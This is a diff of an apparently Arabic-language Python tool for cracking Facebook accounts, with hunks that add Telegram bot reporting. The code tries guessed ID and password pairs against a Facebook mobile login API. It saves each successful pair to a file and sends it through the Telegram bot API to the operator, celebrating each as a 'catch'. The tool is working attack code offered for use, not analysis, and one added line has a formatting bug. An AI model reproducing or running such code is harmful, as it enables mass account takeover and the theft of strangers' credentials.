@@ -16,13 +16,25 @@ for stop in track(range(10)):
 print('   '*10)
 import webbrowser
 webbrowser.open('https://t.me/A_8_A_0')
+import requests,bs4,json,os,sys,uuid,random,datetime,time,re
+import urllib3,rich,base64
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
+import os,time,random,json,sys,datetime
+try:
+    import requests
+except:
+    os.system("pip3 install requests")
+    import requests 
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    
 W = '\x1b[97;1m'
 R = '\x1b[91;1m'
-print('\x1b[1;32m ادخل توكن بوتك')
-token = input('\x1b[1;32m𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ')
-print('')
-print('\x1b[1;32m ادخل ايدي بوتك')
-ID = input('\x1b[1;32m𝐄𝐧𝐭𝐞𝐫 𝐈𝐃  : ')
+print(' \x1b[1;32m ادخل توكن بوتك');token = input('[⊰⊱]\033[1;37m  TOKEN : ')
+print(' \x1b[1;32m ادخل ايدي بوتك');ID=input('\033[1;32m[⊰⊱]\033[1;37m  ID : ');rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= ┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n╮❲ تم تشغيل الاداة بنجاح ❳\n┤❲ سيتم ارسال الصيد الي بوتك ❳\n┤❲ المبرمج ❳ > @A_6_60\n╯❲ قنواتي تيليجرام ❳ ⇣\nBY❲ @A_8_A_0 ❳ 💬 ❲ @OKPY3 ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉').text
 G = '\x1b[92;1m'
 Y = '\x1b[93;1m'
 B = '\x1b[94;1m'
@@ -500,14 +512,33 @@ class Kil_Menu_Vip:
             response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
             if 'session_key' in response.text and 'EAAA' in response.text:
                 cpkil = (''' - ❲ OK امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n\n  ⁂ - ID ➛ %s \n\n\n  ⁂ - PASS ➛ %s \n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n  ⁂ - URL ➛ https://www.facebook.com/profile.php?id=%s&mibextid=ZbWKwL\n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n- BY◆ ➛ @A_6_60 ~ @A_8_A_0\n\t\t\t\t\t''' % (uid, pw,uid))
+                tlg = f'''❲ OK - امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
+╮❲ تم الصيد حساب فيس بوك 💌 ❳
+┤❲ تاريخ الانضمام 2009+2014 ❳
+┤❲ ايدي ❳ {uid}
+┤❲ باسورد ❳ {pw}
+┤❲ المبرمج ❳ > @A_6_60
+╯❲ قنواتي تيليجرام ❳ ⇣
+BY❲ @A_8_A_0 ❳ 💬 ❲ @OKPY3 ❳
+┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉'''
+                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                 print(okkil)
                 self.ok.append('%s|%s' % (uid, pw))
                 open('2009-AMIR-Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
                 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(okkil))
             
             if 'www.facebook.com' in response.json()['error_msg']:
-                cpkil = (''' - ❲ OK امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n\n  ⁂ - ID ➛ %s \n\n\n  ⁂ - PASS ➛ %s \n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n  ⁂ - URL ➛ https://www.facebook.com/profile.php?id=%s&mibextid=ZbWKwL\n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n- BY◆ ➛ @A_6_60 ~ @A_8_A_0\n\t\t\t\t\t''' % (uid, pw,uid))
-                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(cpkil))
+                cpkil = ('''- ❲ OK امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n\n  ⁂ - ID ➛ %s \n\n\n  ⁂ - PASS ➛ %s \n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n  ⁂ - URL ➛ https://www.facebook.com/profile.php?id=%s&mibextid=ZbWKwL\n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n- BY◆ ➛ @A_6_60 ~ @A_8_A_0\n\t\t\t\t\t''' % (uid, pw))
+                tlg = f'''❲ OK - امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
+╮❲ تم الصيد حساب فيس بوك 💌 ❳
+┤❲ تاريخ الانضمام 2009+2014 ❳
+┤❲ ايدي ❳ {uid}
+┤❲ باسورد ❳ {pw}
+┤❲ المبرمج ❳ > @A_6_60
+╯❲ قنواتي تيليجرام ❳ ⇣
+BY❲ @A_8_A_0 ❳ 💬 ❲ @OKPY3 ❳
+┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉'''
+                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                 kilx = nel(cpkil,style='green')
                 cetak(nel(kilx,style='red',title='حساب حلو مثلك'))
         self.loop += 1
